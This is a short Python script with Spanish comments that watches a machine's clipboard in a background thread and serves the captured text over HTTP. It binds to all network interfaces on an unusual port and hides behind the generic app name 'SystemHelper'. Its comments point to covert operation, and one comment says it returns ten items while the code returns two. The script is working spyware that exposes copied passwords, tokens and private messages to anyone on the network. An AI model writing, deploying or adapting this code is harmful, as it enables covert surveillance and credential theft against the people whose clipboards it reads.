import threading
from flask import Flask, jsonify
import pyperclip
import time

# Inicia la aplicación Flask con un nombre genérico
app = Flask("SystemHelper")
clipboard_data = []

def monitor_clipboard():
    """Monitoriza el portapapeles en segundo plano y guarda los cambios en memoria."""
    last_text = ""
    while True:
        try:
            current_text = pyperclip.paste()
            if current_text != last_text:
                clipboard_data.append(current_text)
                last_text = current_text
        except Exception:
            pass
        time.sleep(1)  # Ajusta según sea necesario para mayor frecuencia

@app.route('/')
def serve_clipboard():
    """Proporciona el contenido del portapapeles en memoria."""
    return jsonify({"clipboard": clipboard_data[-2:]})  # Devuelve los últimos 10 elementos

if __name__ == "__main__":
    # Ejecuta el monitoreo del portapapeles en un hilo separado
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    # Inicia el servidor en un puerto no convencional
    app.run(host="0.0.0.0", port=65432)
